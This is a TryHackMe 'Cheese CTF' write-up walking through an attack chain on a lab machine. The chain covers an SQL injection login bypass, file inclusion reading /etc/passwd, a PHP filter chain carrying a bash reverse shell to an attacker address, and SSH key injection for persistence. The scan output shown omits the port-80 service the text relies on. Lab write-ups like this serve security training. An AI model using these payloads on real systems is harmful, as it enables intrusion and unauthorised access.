# Cheese CTF — TryHackMe Writeup

**Room:** https://tryhackme.com/r/room/cheesectfv10
**Difficulty:** Easy
**Category:** Web Exploitation · LFI · Privilege Escalation

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

Started with an Nmap service scan to identify open ports.

```bash
death@esther:~$ nmap 10.10.228.119 -sV -T4

PORT      STATE SERVICE               VERSION
1/tcp     open  tcpmux?
3/tcp     open  compressnet?
340/tcp   open  http                  Motorola cable modem webadmin
366/tcp   open  odmr?
389/tcp   open  telnet                Allied Telesis x900-series switch telnetd
406/tcp   open  melange               Melange Chat Server 3VhUqW
407/tcp   open  pop3-proxy            AVG pop3 proxy 346/67007
416/tcp   open  silverplatter?
417/tcp   open  onmux?
425/tcp   open  telnet
427/tcp   open  telnet
443/tcp   open  https?
444/tcp   open  smtp                  IMail NT-ESMTP
445/tcp   open  http                  Corel Paradox relational database web interface
458/tcp   open  printer               Microsoft lpd
```

Many ports are open but the most interesting one is HTTP on port 80. Navigating to the site reveals a basic web interface.

---

## 2. Web Enumeration

Running `dirsearch` to discover hidden directories and files.

```bash
dirsearch -u 10.10.228.119

[01:35:14] 301 -  315B  - /images  ->  http://10.10.228.119/images/
[01:35:14] 200 -  485B  - /images/
[01:35:18] 200 -  370B  - /login.php
[01:35:25] 200 -  254B  - /orders.html
[01:35:34] 403 -  278B  - /server-status
[01:35:43] 200 -  254B  - /users.html
```

`/login.php` stands out. Navigating to it shows a standard login form.

---

## 3. SQL Injection — Bypassing Login

With no credentials to work with, the first thing to try is SQL injection. The classic OR-based bypass works immediately.

```
' || '1'='1';-- -
```

This grants access to the dashboard. The site appears blank, but clicking around reveals a hidden message and a path in the URL:

```
http://10.10.228.119/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
```

The `file=` parameter with a `php://filter` wrapper is a strong signal for **Local File Inclusion (LFI)**.

---

## 4. Local File Inclusion (LFI)

Swapping out the PHP filter for `/etc/passwd` confirms the vulnerability.

```
http://10.10.228.119/secret-script.php?file=/etc/passwd
```

The server responds with the full `/etc/passwd` file — we have arbitrary file read.

---

## 5. PHP Filter Chain — Remote Code Execution

With LFI confirmed, the next step is to escalate it to RCE using a PHP filter chain. This technique abuses PHP's `convert.*` filters to inject executable PHP code without needing to write a file to disk.

Clone the filter chain generator and create the payload:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator
```

```bash
python3 php_filter_chain_generator.py \
  --chain '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/YOUR-IP/4444 0>&1\""); ?>' \
  | grep "^php" > payload.txt
```

The resulting `payload.txt` contains a very long PHP filter chain that injects a bash reverse shell.

---

## 6. Getting a Shell

Start a netcat listener in one terminal:

```bash
nc -lnvp 4444
```

Send the payload via `curl`:

```bash
curl "http://10.10.228.119/secret-script.php?file=$(cat payload.txt)"
```

A reverse shell connects back. We land as the web server user (`www-data`).

---

## 7. Privilege Escalation — SSH Key Injection

Start a Python HTTP server on the attack machine and download `linpeas.sh` to the target for automated enumeration:

```bash
# On attacker
python3 -m http.server 8000

# On target shell
wget http://YOUR-IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

Linpeas highlights a writable file: `/home/comte/.ssh/authorized_keys`. This is the privilege escalation path — injecting our own SSH public key lets us log in directly as `comte`.

Generate an SSH key pair on the attacker machine:

```bash
ssh-keygen -t rsa
```

View the generated public key:

```bash
cat .ssh/id_rsa.pub
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...death@esther
```

In the reverse shell, append the public key to comte's `authorized_keys`:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAFK2k5zBYD1W7EtVkTHU6WcmMw/TOS7Wp\
XtZsiR6QmgwZWv7KzZ43OVTXJ22s8os5NnLp0ABrr0CwjVFoH5uDYcAzKEZp3GtbLVr0TZaNT6V\
ds8SeZ+5RZzGs/84Ue5FBAQVeak/5+wjZoYezOTV9c7YrkIDSS1Rs0xQ0zfjcIdumzhM5grL+ldp\
a1HB1J1PzBDfkP2hWwL0pt4et6GhCtpGkYSyS8rLwkU2G/S/qB0iB/OM2hGeWHpbIhQDAB15bVn\
zjQksBNeagdlFHmQ90pjVG0oTaWp3hpzMrLUav/6Vt/1O2HE8KZ11erIDMgIpNc5nbvSWJfCDFH\
4JX1/UFod0v/lQTm6LEsnSf1E4CTK/FVAAKuYAd6IM8Ul1//Re2x9Eh5oRRVpIGVwq83di3N8mK\
iSSLHirL7k+SrkmViJ+hJtaC6FbbxSikjnq5vdqs6k9CzXk6aQKD29NY/npFvKTjxDEJDKiUr7I\
DOvKLKMx6BS2T7bVePBGidNxwxY8= death@esther" \
>> /home/comte/.ssh/authorized_keys
```

---

## 8. SSH Login as comte

```bash
ssh -i id_rsa comte@10.10.228.119
```

Shell opens as `comte`. Grab the user flag:

```bash
cat ~/user.txt
```

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 9. Root Flag

From here, further enumeration or sudo/SUID abuse would be used to escalate to root. Once root is obtained:

```bash
cat /root/root.txt
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Key Learnings

- **SQL Injection for auth bypass** — when no credentials are available, always test classic SQLi payloads like `' || '1'='1';-- -` against login forms.
- **PHP `file=` parameters are LFI hotspots** — any parameter loading files server-side should be tested with `/etc/passwd` first.
- **PHP filter chains enable RCE from LFI** — even without direct file upload, chaining PHP conversion filters can inject arbitrary PHP code and escalate read to full RCE.
- **Writable `authorized_keys` = SSH backdoor** — if linpeas finds a writable `~/.ssh/authorized_keys` for any user, injecting your own public key is a clean and reliable privesc path that doesn't rely on cracking passwords.

## Conclusion

Cheese CTF walks through a classic web exploitation chain: bypass a weak login with SQL injection, find a `file=` parameter vulnerable to LFI, escalate to RCE using a PHP filter chain generator, then pivot to SSH access by abusing a world-writable `authorized_keys` file. Each step builds on the last, making this a great room for drilling the LFI-to-RCE escalation path.
